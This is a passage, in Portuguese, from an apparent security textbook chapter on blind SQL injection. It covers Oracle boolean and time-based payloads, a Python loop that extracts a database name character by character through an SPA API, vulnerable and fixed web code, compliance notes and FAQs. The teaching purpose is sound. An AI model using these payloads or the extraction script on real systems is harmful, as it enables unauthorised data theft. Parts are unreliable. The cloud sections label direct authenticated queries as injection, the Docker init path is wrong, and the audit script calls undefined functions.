' AND ASCII(SUBSTR(SYS.LOGIN_USER,1,1))=112--

-- Time-based
' AND CASE WHEN LENGTH(SYS.LOGIN_USER)=12 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END FROM dual--
```

---

## 6.18 Conclusao

Blind SQL injection continua sendo uma das tecnicas de ataque mais eficazes e dificeis de detectar. Embora mais lenta que a SQL injection classica, a capacidade de extrair dados completos de um banco de dados a torna uma ameaca significativa.

As defesas contra blind injection sao as mesmas contra SQL injection em geral: parameterized queries, validacao de entrada, WAF, e monitoramento. A diferenca esta na deteccao: blind injection e mais dificil de detectar porque nao gera erros visiveis ou respostas incomuns.

Organizacoes devem implementar defesa em profundidade, monitoramento de padroes de requisicoes, e testes regulares de seguranca para identificar e remediar vulnerabilidades de blind injection antes que atacantes as explorem.

---

## 6.19 Blind Injection em Aplicacoes Modernas

### Blind Injection em Single Page Applications (SPAs)

SPAs frequentemente usam APIs REST que podem ser vulneraveis a blind injection:

```javascript
// React: componente que busca usuarios
function UserSearch({ searchTerm }) {
  const [users, setUsers] = useState([]);
  
  useEffect(() => {
    // VULNERAVEL: searchTerm incorporado a query
    fetch(`/api/users?search=${searchTerm}`)
      .then(res => res.json())
      .then(data => setUsers(data));
  }, [searchTerm]);
  
  return (
    <ul>
      {users.map(user => <li key={user.id}>{user.name}</li>)}
    </ul>
  );
}

// SEGURO: usar parameterized queries no backend
// O frontend deve enviar dados puros, o backend deve usar parameterized queries
```

**Extracao via SPA:**

```python
def extract_via_spa(api_url, param):
    """Extrair dados via SPA API."""
    
    # Calibrar
    resp_true = requests.get(api_url, params={param: "1 AND 1=1--"})
    resp_false = requests.get(api_url, params={param: "1 AND 1=2--"})
    
    # Verificar se a SPA retorna dados diferentes
    # SPAs podem retornar JSON vazio vs JSON com dados
    
    result = ""
    for i in range(1, 100):
        for char in range(32, 127):
            payload = f"1 AND ASCII(SUBSTRING(database(),{i},1))={char}--"
            resp = requests.get(api_url, params={param: payload})
            
            # Analisar resposta JSON
            if resp.json():  # Se retornou dados
                result += chr(char)
                break
    
    return result
```

### Blind Injection em Progressive Web Apps (PWAs)

```javascript
// Service Worker: interceptar requisicoes
self.addEventListener('fetch', (event) => {
  const url = new URL(event.request.url);
  
  // VULNERAVEL: parametros de URL incorporados a queries
  if (url.pathname === '/api/search') {
    const query = url.searchParams.get('q');
    // Se o backend nao usa parameterized queries, pode ser vulneravel
  }
});
```

### Blind Injection em Micro-frontends

```javascript
// Module Federation: modulo de busca
// microfrontend-search/src/App.js
function SearchModule() {
  const [results, setResults] = useState([]);
  
  const handleSearch = async (term) => {
    // VULNERAVEL: term incorporado a query no backend
    const response = await fetch(`/api/search?q=${encodeURIComponent(term)}`);
    const data = await response.json();
    setResults(data);
  };
  
  return (
    <div>
      <input onChange={(e) => handleSearch(e.target.value)} />
      <ResultsList results={results} />
    </div>
  );
}
```

### Blind Injection em Server-Side Rendering (SSR)

```python
# Django: SSR com query vulneravel
def search_view(request):
    query = request.GET.get('q', '')
    
    # VULNERAVEL: query incorporada a SQL
    results = Product.objects.raw(
        f"SELECT * FROM products WHERE name LIKE '%{query}%'"
    )
    
    return render(request, 'search.html', {'results': results})

# SEGURO
def search_view_safe(request):
    query = request.GET.get('q', '')
    
    # SEGURO: parameterized query
    results = Product.objects.raw(
        "SELECT * FROM products WHERE name LIKE %s",
        [f'%{query}%']
    )
    
    return render(request, 'search.html', {'results': results})
```

---

## 6.20 Blind Injection em Ambientes de Cloud

### Blind Injection em AWS RDS

```python
# AWS RDS: blind injection pode causar impacto significativo
import boto3

def extract_via_rds(endpoint, database, username, password):
    """Extrair dados de AWS RDS via blind injection."""
    
    import mysql.connector
    
    conn = mysql.connector.connect(
        host=endpoint,
        database=database,
        user=username,
        password=password
    )
    
    cursor = conn.cursor()
    
    # Extrair informacoes do RDS
    # Versao do MySQL
    version_query = "SELECT VERSION()"
    
    # Extrair dados de metadados do RDS
    rds_query = "SELECT @@hostname"
    
    return extract_blind_data(cursor, rds_query)
```

### Blind Injection em Google Cloud SQL

```python
# Google Cloud SQL: blind injection via Cloud SQL Proxy
import sqlalchemy

def extract_via_cloudsql(instance_connection_name, database, user, password):
    """Extrair dados de Google Cloud SQL."""
    
    # Conectar via Cloud SQL Proxy
    engine = sqlalchemy.create_engine(
        f'mysql+mysqldb://{user}:{password}@/{database}'
        f'?unix_socket=/cloudsql/{instance_connection_name}'
    )
    
    with engine.connect() as conn:
        # Blind injection
        query = "SELECT 1 AND LENGTH(database())=12"
        result = conn.execute(query)
        # Analisar resultado
```

### Blind Injection em Azure SQL

```python
# Azure SQL: blind injection via pyodbc
import pyodbc

def extract_via_azure_sql(connection_string):
    """Extrair dados de Azure SQL."""
    
    conn = pyodbc.connect(connection_string)
    cursor = conn.cursor()
    
    # Extrair versao do Azure SQL
    version_query = "SELECT @@VERSION"
    
    # Blind injection
    for i in range(1, 100):
        for char in range(32, 127):
            payload = f"SELECT CASE WHEN ASCII(SUBSTRING(@@VERSION,{i},1))={char} THEN 1 ELSE 0 END"
            cursor.execute(payload)
            result = cursor.fetchone()
            
            if result[0] == 1:
                print(chr(char), end='')
                break
```

### Blind Injection em Docker com Banco de Dados

```dockerfile
# Dockerfile para ambiente de teste de blind injection
FROM mysql:8.0

# Configurar MySQL
ENV MYSQL_ROOT_PASSWORD=root
ENV MYSQL_DATABASE=testdb
ENV MYSQL_USER=appuser
ENV MYSQL_PASSWORD=apppass

# Criar tabela de teste
COPY init.sql /docker-entrypoint-init.d/

# init.sql
# CREATE TABLE users (
#     id INT PRIMARY KEY AUTO_INCREMENT,
#     username VARCHAR(50),
#     password_hash VARCHAR(255),
#     email VARCHAR(100),
#     role VARCHAR(20)
# );
# INSERT INTO users VALUES 
# (1, 'admin', '$2y$10$hash', 'admin@test.com', 'admin'),
# (2, 'user1', '$2y$10$hash', 'user1@test.com', 'user');
```

---

## 6.21 Blind Injection e Compliance

### Requisitos de Compliance

**PCI DSS (Payment Card Industry Data Security Standard):**

```markdown
Requisito 6.5.1: SQL injection
- Desenvolvedores devem ser treinados em seguranca de codigo
- Codigo deve ser revisado para vulnerabilidades de SQLi
- Testes de seguranca devem ser realizados antes do deploy
```

**GDPR (General Data Protection Regulation):**

```markdown
Artigo 32: Seguranca do tratamento
- Medidas tecnicas e organizacionais adequadas ao nivel de risco
- Inclui protecao contra acesso nao autorizado e SQL injection
```

**LGPD (Lei Geral de Protecao de Dados):**

```markdown
Artigo 46: Seguranca e sigilo
- Medidas tecnicas e administrativas aptas a proteger dados
- Inclui protecao contra vulnerabilidades como SQLi
```

### Auditoria de Seguranca

```python
# Script de auditoria para blind injection
import subprocess
import json

def audit_application(url):
    """Auditoria basica de blind injection."""
    
    results = {
        'url': url,
        'tests': [],
        'vulnerabilities': [],
        'recommendations': []
    }
    
    # Teste 1: Boolean-based
    test1 = test_boolean_injection(url)
    results['tests'].append({
        'name': 'Boolean-based blind injection',
        'vulnerable': test1
    })
    
    # Teste 2: Time-based
    test2 = test_time_injection(url)
    results['tests'].append({
        'name': 'Time-based blind injection',
        'vulnerable': test2
    })
    
    # Teste 3: Cookie injection
    test3 = test_cookie_injection(url)
    results['tests'].append({
        'name': 'Cookie-based blind injection',
        'vulnerable': test3
    })
    
    # Analise
    if any(t['vulnerable'] for t in results['tests']):
        results['recommendations'].append('Implement parameterized queries')
        results['recommendations'].append('Add input validation')
        results['recommendations'].append('Enable WAF protection')
    
    return results

def generate_report(results):
    """Gerar relatorio de auditoria."""
    
    report = f"""
# Relatorio de Auditoria - Blind SQL Injection

## URL: {results['url']}

## Testes Realizados
"""
    
    for test in results['tests']:
        status = "VULNERAVEL" if test['vulnerable'] else "SEGURO"
        report += f"- {test['name']}: {status}\n"
    
    if results['vulnerabilities']:
        report += "\n## Vulnerabilidades Encontradas\n"
        for vuln in results['vulnerabilities']:
            report += f"- {vuln}\n"
    
    if results['recommendations']:
        report += "\n## Recomendacoes\n"
        for rec in results['recommendations']:
            report += f"- {rec}\n"
    
    return report
```

---

## 6.22 Blind Injection: Perguntas Frequentes

### Pergunta 1: Blind injection e mais perigosa que SQL injection classica?

**Resposta:** Depende do contexto. SQL injection classica (in-band) e mais facil de explorar e pode causar impacto imediato. Blind injection e mais lenta mas pode ser igualmente perigosa porque permite extracao completa de dados, mesmo quando a aplicacao nao retorna erros ou dados diretamente.

### Pergunta 2: Como detectar blind injection em producao?

**Resposta:** Monitorar padroes de requisicoes com ASCII/SUBSTRING/LENGTH, detectar requisicoes repetitivas com condicoes AND, e monitorar tempo de resposta de queries no banco de dados.

### Pergunta 3: Blind injection pode causar dano alem de extracao de dados?

**Resposta:** Sim. Blind injection pode ser usada para:
- Extracao de dados sensiveis
- Manipulacao de dados (via stacked queries)
- Escalacao de privilegios
- Comprometimento do sistema (se houver execucao de comandos)

### Pergunta 4: Parameterized queries eliminam blind injection?

**Resposta:** Sim. Parameterized queries eliminam TODOS os tipos de SQL injection, incluindo blind injection, porque separam a estrutura da query dos dados.

### Pergunta 5: WAF pode prevenir blind injection?

**Resposta:** WAF pode detectar e bloquear muitos payloads de blind injection, mas nao e 100% eficaz. Atacantes podem usar tecnicas de bypass. WAF deve ser usado como camada adicional de defesa, nao como unica defesa.
